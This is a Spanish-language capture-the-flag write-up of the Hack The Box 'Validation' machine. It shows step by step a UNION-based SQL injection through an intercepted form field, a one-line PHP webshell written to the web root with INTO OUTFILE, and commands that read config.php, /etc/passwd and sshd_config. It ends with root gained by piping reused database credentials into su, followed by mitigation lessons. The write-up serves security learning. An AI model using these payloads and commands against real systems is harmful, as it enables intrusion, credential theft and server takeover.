---
titulo: "Validation"
fecha: 2026-10-12
plataforma: htb
so: linux
dificultad: Easy
estado: publicado
tecnicas: [inyeccion-sql, webshell, reutilizacion-de-credenciales]
herramientas: [nmap, burpsuite]
---

# Validation

## Resumen

Máquina Linux, dificultad Easy. La hice como parte de mi ruta de aprendizaje en seguridad mientras estudio ASIR. La dejo documentada tal y como la fui resolviendo, con los atascos incluidos, porque creo que así se entiende mejor el proceso real que si solo pongo "comando → resultado → flag".

## Primeros pasos

Lo primero, un ping para ver si la máquina respondía:

```bash
ping 10.129.95.235
```

Respondía bien, y me fijé en el TTL:

```
64 bytes from 10.129.95.235: icmp_seq=1 ttl=63 time=55.0 ms
```

TTL=63 → es un indicio de que es Linux (normalmente arranca en 64 y al pasar por un salto de red baja a 63).

Después lancé el típico escaneo de Nmap, buscando antes qué hacía cada parámetro porque no quería usarlo sin entenderlo:

```bash
nmap -sC -sV -p- --open -n -Pn 10.129.95.235
```

- `-sC` → scripts por defecto de Nmap
- `-sV` → detecta versiones de los servicios
- `-p-` → todos los puertos, no solo los 1000 típicos
- `--open` → solo enseña los que están abiertos
- `-n` → no resuelve DNS
- `-Pn` → no hace ping previo (lo trata como activo directamente)

Salió el puerto 80 abierto, un Apache.

Para saber qué lenguaje usaba la web (pregunta guiada de HTB), hice un curl rápido:

```bash
curl -I http://10.129.95.235
```

Y en las cabeceras salió:

```
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
```

Lenguaje: **PHP**.

---

## Buscando el campo inyectable (aquí me atasqué bastante)

No hice fuzzing de directorios ni nada de enumeración web "seria", fui directo al formulario de registro de la página, que era básicamente el único sitio donde metías datos.

Probé a meter una comilla `'` en los campos para ver si rompía algo. El problema es que el campo **país** no era un input de texto, era un desplegable (`<select>`), así que no podía escribir nada ahí directamente desde el navegador. Me quedé un rato sin entender cómo iba a inyectar algo en un campo que ni siquiera te deja escribir.

La solución fue meterle Burp Suite por medio: interceptas la petición antes de que salga, y ahí sí puedes cambiar el valor de `country` a lo que quieras, aunque en el navegador fuera un desplegable cerrado.

El flujo que me quedó (y que al principio me costó pillar) fue:

1. Hago un **POST** a `/` registrando un usuario nuevo (el username no se puede repetir, así que fui tirando de `test1`, `test2`, `pruebaX`...) y en `country` meto el payload SQL
2. El servidor responde `302 Found` + una cookie (`Set-Cookie: user=XXXX`) → esto solo significa "registro hecho, te mando a account.php", nada más raro
3. Cojo esa cookie
4. Hago un **GET** a `/account.php` metiendo esa cookie en la cabecera
5. En esa respuesta veo reflejado el resultado de lo que inyecté

(Nota para mí mismo: en su momento pensé que como daba un 302 esto era una inyección "blind", pero no — es justo lo contrario. Es una SQLi **in-band / basada en UNION**, porque veo el resultado directo en el HTML de la respuesta. Blind sería si no me devolviera nada y tuviera que deducirlo por tiempos de respuesta o true/false.)

---

## Confirmando que de verdad era inyectable

No me quería quedar con la duda de "esto es inyectable o me estoy autoengañando porque le puse un nombre random". Dos cosas me lo confirmaron de verdad:

**1.** Cuando probaba con un número de columnas que no cuadraba, el servidor petaba con esto:

```
Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
```

Eso es un error de PHP hablando de una función de MySQL. Si el campo fuera texto normal, jamás pasaría esto solo por cambiar lo que escribo.

**2.** Cuando metí `UNION SELECT database()`, la página me devolvió el nombre real de la base de datos del servidor (`registration`). Eso no puede ser casualidad de ninguna manera — solo pasa si mi texto se está ejecutando como código SQL de verdad.

### Contando columnas

Fui probando a lo bruto:

```sql
' UNION SELECT 1,2,3-- -   → error
' UNION SELECT 1,2-- -     → error
' UNION SELECT 1-- -       → funciona
```

1 sola columna.

---

## Sacando info de la base de datos

Con la columna disponible, fui tirando del hilo usando `information_schema`, que es una base de datos de metadatos que tiene cualquier instalación de MySQL por defecto (el "índice" de todo lo que hay).

**Nombre de la BD:**
```sql
' UNION SELECT database()-- -
```
→ `registration`

**Tablas:**
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='registration'-- -
```
→ solo había una tabla, `registration`

**Columnas:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='registration'-- -
```
→ `username`, `userhash`, `country`, `regtime`

**Volcando `userhash`:**
```sql
' UNION SELECT userhash FROM registration-- -
```
Salió una lista de hashes MD5. Pensé que igual eran contraseñas, pero resultaron ser las cookies de sesión de cada usuario registrado. Callejón sin salida, pero esperable — el camino de esta máquina no iba por ahí.

---

## De la inyección a tener una shell

MySQL te deja escribir archivos en el disco del servidor con `INTO OUTFILE`, si el usuario de la BD tiene el privilegio `FILE`. Usé eso para meter una webshell directamente en la carpeta pública de Apache:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
```

Esto escribe ese código PHP en un archivo nuevo (`shell.php`), accesible desde fuera porque cae justo en la raíz web. Ese PHP coge lo que le mandes en el parámetro `cmd` y lo ejecuta como comando del sistema. A partir de aquí ya no estoy usando SQL para nada, tengo ejecución de comandos directa desde el navegador:

```
http://10.129.95.235/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) grupos=33(www-data)
```

El usuario con el que corre la web es **www-data**.

---

## Escalando a root

### Lo que no funcionó

```
http://10.129.95.235/shell.php?cmd=sudo -l
```
Nada.

```
http://10.129.95.235/shell.php?cmd=find / -perm -4000 -type f 2>/dev/null
```
Solo los SUID normales de Debian, nada aprovechable.

### Mirando los archivos de la propia web

Como www-data es quien corre la aplicación, miré sus propios archivos, por si había alguna contraseña suelta por ahí (error típico, meter credenciales directamente en el código):

```
http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php
```

El navegador me lo devolvía en blanco porque intentaba interpretar las etiquetas `<?php ?>` en vez de mostrarlas como texto. Lo saqué en base64 para que no se rompiera:

```
http://10.129.95.235/shell.php?cmd=cat /var/www/html/config.php | base64
```

Decodificado:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
?>
```

Credenciales de MySQL: `uhc` / `uhc-9qual-global-pw`

### Buscando dónde reutilizar esa contraseña

La pista oficial de la máquina decía: *"Password reuse is a real problem. Look for passwords in files the www-data user has access to and check for reuse."*

Miré qué usuarios del sistema tenían una shell real (no `/usr/sbin/nologin`):

```
http://10.129.95.235/shell.php?cmd=cat /etc/passwd
```

`/etc/passwd` siempre existe en cualquier Linux, no es nada "secreto" que haya descubierto por el hackeo — lo que buscaba ahí era simplemente qué usuario tenía `/bin/bash`. Y el único con shell de verdad era **root**, todos los demás usuarios de servicio tenían `/usr/sbin/nologin` o `/bin/false`.

### Intento 1: SSH (falló)

```bash
ssh root@10.129.95.235
```
Con `uhc-9qual-global-pw` → Permission denied, tres veces.

Miré la config de SSH:
```
http://10.129.95.235/shell.php?cmd=cat /etc/ssh/sshd_config
```
```
#PermitRootLogin prohibit-password
```
Ese es el valor por defecto de OpenSSH, root no puede entrar por contraseña por SSH, solo con clave pública. Por eso fallaba aunque la contraseña fuera la correcta.

### Intento 2: `su` desde la webshell (funcionó)

Como ya tenía ejecución de comandos vía la webshell, no necesitaba SSH para nada. Usé `su` directamente, pasando la contraseña por pipe porque no tengo una terminal interactiva real, solo puedo mandar comandos sueltos por la URL:

```
http://10.129.95.235/shell.php?cmd=echo uhc-9qual-global-pw | su root -c "cat /root/root.txt"
```

- `echo` imprime la contraseña
- el pipe `|` la manda como si la hubiera escrito yo cuando `su` la pide
- `su root -c "..."` se autentica como root y ejecuta solo ese comando, sin abrir sesión completa

Y con eso, dentro.

---

## Flags

| Flag | Valor |
|------|-------|
| user.txt | `[REDACTED]` |
| root.txt | `[REDACTED]` |

*(las dejo censuradas, HTB pide no publicarlas completas en write-ups públicos)*

---

## Mitigación

Usar consultas parametrizadas (*prepared statements*) para eliminar la inyección SQL. No reutilizar contraseñas entre servicios: la de la base de datos no debería servir para la cuenta de root del sistema. Aplicar privilegios mínimos a la cuenta de base de datos.

## Qué he aprendido

- **Nunca concatenar input del usuario en una query SQL.** Esto se arregla con prepared statements/consultas parametrizadas — así el motor trata lo que escribes siempre como dato, nunca como código, pase lo que pase.
- **No reutilizar contraseñas entre sistemas distintos.** La contraseña de MySQL y la de root del sistema operativo eran la misma. Son dos niveles de acceso totalmente distintos (datos vs. control total del servidor) y nunca deberían depender del mismo secreto.
- **No hardcodear credenciales en el código.** La contraseña estaba en texto plano en `config.php`. Debería ir en variables de entorno o un gestor de secretos, fuera del código y fuera de la carpeta pública de la web.
- **Root no debería ser el único usuario con shell interactiva.** Lo normal es tener usuarios nominales con `sudo` sobre lo que necesiten, y mantener el acceso directo a root muy restringido.
- **Mínimo privilegio también en la base de datos.** El usuario `uhc` tenía privilegio `FILE`, que fue justo lo que me permitió pasar de una SQLi a ejecución de comandos. Un usuario de aplicación no debería poder escribir archivos a nivel de sistema operativo.

Y a nivel de metodología: la próxima vez abro Burp con Intercept activado desde el principio y navego la web una vez entera así, en vez de ir probando a pelo en el navegador y darme cuenta tarde de que un campo (como el desplegable de país) no se puede tocar directamente desde ahí. Me habría ahorrado bastante lío.
